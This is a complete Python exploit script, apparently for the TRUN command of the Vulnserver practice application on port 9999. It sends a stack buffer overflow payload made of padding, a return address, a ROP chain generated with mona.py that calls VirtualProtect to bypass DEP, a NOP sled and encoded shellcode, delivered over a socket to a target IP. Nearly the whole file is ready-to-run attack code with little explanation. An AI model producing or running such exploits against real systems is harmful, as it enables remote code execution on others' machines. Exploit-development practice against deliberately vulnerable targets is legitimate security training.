#! /bin/python3

import socket   # The module "socket" provides access to the BSD socket interface
import struct   # The module "struct" performs conversions between Python values and C structs represented as Python bytes objects.
import sys      # The module "sys" provides access to the runtime environment and allows us to gather information about it.

# Check that we have a target IP
if (len(sys.argv) < 2):
    print("This program requires one Command Line Argument. This should be the IPv4 address of the target machine")
    exit(1)

# Set Constants for later use
HOST = sys.argv[1]  # Extract target IP
PORT = 9999         # victim port

SHELL =  b""
SHELL += b"\xba\x24\x9a\xc8\xe7\xdb\xc8\xd9\x74\x24\xf4\x58"
SHELL += b"\x2b\xc9\xb1\x53\x83\xc0\x04\x31\x50\x0e\x03\x74"
SHELL += b"\x94\x2a\x12\x88\x40\x28\xdd\x70\x91\x4d\x57\x95"
SHELL += b"\xa0\x4d\x03\xde\x93\x7d\x47\xb2\x1f\xf5\x05\x26"
SHELL += b"\xab\x7b\x82\x49\x1c\x31\xf4\x64\x9d\x6a\xc4\xe7"
SHELL += b"\x1d\x71\x19\xc7\x1c\xba\x6c\x06\x58\xa7\x9d\x5a"
SHELL += b"\x31\xa3\x30\x4a\x36\xf9\x88\xe1\x04\xef\x88\x16"
SHELL += b"\xdc\x0e\xb8\x89\x56\x49\x1a\x28\xba\xe1\x13\x32"
SHELL += b"\xdf\xcc\xea\xc9\x2b\xba\xec\x1b\x62\x43\x42\x62"
SHELL += b"\x4a\xb6\x9a\xa3\x6d\x29\xe9\xdd\x8d\xd4\xea\x1a"
SHELL += b"\xef\x02\x7e\xb8\x57\xc0\xd8\x64\x69\x05\xbe\xef"
SHELL += b"\x65\xe2\xb4\xb7\x69\xf5\x19\xcc\x96\x7e\x9c\x02"
SHELL += b"\x1f\xc4\xbb\x86\x7b\x9e\xa2\x9f\x21\x71\xda\xff"
SHELL += b"\x89\x2e\x7e\x74\x27\x3a\xf3\xd7\x20\x8f\x3e\xe7"
SHELL += b"\xb0\x87\x49\x94\x82\x08\xe2\x32\xaf\xc1\x2c\xc5"
SHELL += b"\xd0\xfb\x89\x59\x2f\x04\xea\x70\xf4\x50\xba\xea"
SHELL += b"\xdd\xd8\x51\xea\xe2\x0c\xcf\xe2\x45\xff\xf2\x0f"
SHELL += b"\x35\xaf\xb2\xbf\xde\xa5\x3c\xe0\xff\xc5\x96\x89"
SHELL += b"\x68\x38\x19\xa4\x34\xb5\xff\xac\xd4\x93\xa8\x58"
SHELL += b"\x17\xc0\x60\xff\x68\x22\xd9\x97\x21\x24\xde\x98"
SHELL += b"\xb1\x62\x48\x0e\x3a\x61\x4c\x2f\x3d\xac\xe4\x38"
SHELL += b"\xaa\x3a\x65\x0b\x4a\x3a\xac\xfb\xef\xa9\x2b\xfb"
SHELL += b"\x66\xd2\xe3\xac\x2f\x24\xfa\x38\xc2\x1f\x54\x5e"
SHELL += b"\x1f\xf9\x9f\xda\xc4\x3a\x21\xe3\x89\x07\x05\xf3"
SHELL += b"\x57\x87\x01\xa7\x07\xde\xdf\x11\xee\x88\x91\xcb"
SHELL += b"\xb8\x67\x78\x9b\x3d\x44\xbb\xdd\x41\x81\x4d\x01"
SHELL += b"\xf3\x7c\x08\x3e\x3c\xe9\x9c\x47\x20\x89\x63\x92"
SHELL += b"\xe0\xa9\x81\x36\x1d\x42\x1c\xd3\x9c\x0f\x9f\x0e"
SHELL += b"\xe2\x29\x1c\xba\x9b\xcd\x3c\xcf\x9e\x8a\xfa\x3c"
SHELL += b"\xd3\x83\x6e\x42\x40\xa3\xba"

# !mona rop -m *.dll -n
# C:\Users<User>\AppData\Local\VirtualStore\Program Files (x86)\Immunity Inc\Immunity Debugger
def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
        0x759a72ee,  # POP EBX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
        0x75616164,  # ptr to &VirtualProtect() [IAT ucrtbase.dll] ** REBASED ** ASLR
        0x77033a91,  # MOV ESI,DWORD PTR DS:[EBX] # ADD CL,CL # RETN [OLEAUT32.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ebp:---]
        0x755ed71c,  # POP EBP # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        0x755677c5,  # & push esp # ret  [ucrtbase.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_ebx:---]
        0x7699383b,  # POP EAX # RETN [RPCRT4.dll] ** REBASED ** ASLR 
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x75999874,  # NEG EAX # RETN [KERNEL32.DLL] ** REBASED ** ASLR 
        0x7551b2d6,  # XCHG EAX,EBX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_edx:---]
        0x75652f51,  # POP EAX # RETN [msvcp_win.dll] ** REBASED ** ASLR 
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x7678c8ba,  # NEG EAX # RETN [combase.dll] ** REBASED ** ASLR 
        0x75c3f361,  # XCHG EAX,EDX # RETN [WS2_32.dll] ** REBASED ** ASLR 
        #[---INFO:gadgets_to_set_ecx:---]
        0x7664de48,  # POP ECX # RETN [combase.dll] ** REBASED ** ASLR 
        0x77b20acc,  # &Writable location [ntdll.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_edi:---]
        0x77a873f2,  # POP EDI # RETN [ntdll.dll] ** REBASED ** ASLR 
        0x75c077c7,  # RETN (ROP NOP) [WS2_32.dll] ** REBASED ** ASLR
        #[---INFO:gadgets_to_set_eax:---]
        0x7556aa31,  # POP EAX # RETN [ucrtbase.dll] ** REBASED ** ASLR 
        0x90909090,  # nop
        #[---INFO:pushad:---]
        0x77a084d1,  # PUSHAD # RETN [ntdll.dll] ** REBASED ** ASLR 
    ]
    return b''.join(struct.pack('<I', _) for _ in rop_gadgets)


PAYLOAD = (
    b'TRUN /.:/' +
    b'A' * 1995 +
    # RETN
    struct.pack('<L', 0x62501039) +
    create_rop_chain() +
    b'\x90' * 64 +
    SHELL +
    b'C' * 990
)

with socket.create_connection((HOST, PORT)) as fd:
    fd.sendall(PAYLOAD)
